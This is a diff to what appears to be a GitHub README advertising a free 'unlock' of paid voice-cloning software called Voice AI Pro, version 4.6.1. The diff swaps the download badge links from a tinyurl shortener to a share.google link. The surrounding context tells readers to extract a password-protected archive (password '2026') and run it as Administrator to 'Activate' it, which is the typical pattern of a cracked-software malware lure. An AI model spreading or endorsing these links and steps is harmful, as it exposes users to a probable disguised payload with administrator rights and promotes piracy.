@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voice-ai-pro)
+[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/fb99W75H2fJPlGq6Q)
 
 </div>
 
@@ -115,7 +115,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch Voice AI
 
-[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voice-ai-pro)
+[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/fb99W75H2fJPlGq6Q)
 
 ### Detailed Instructions (May 2026 Update)
 
@@ -260,7 +260,7 @@ Get professional AI voice cloning and real-time voice changer for free. **Voice 
 
 <div align="center">
 
-[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voice-ai-pro)
+[![Download Voice AI Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/fb99W75H2fJPlGq6Q)
 
 **Version 4.6.1** — Free AI voice pro unlock. May 2026 update. Zero cost. No payment.
 
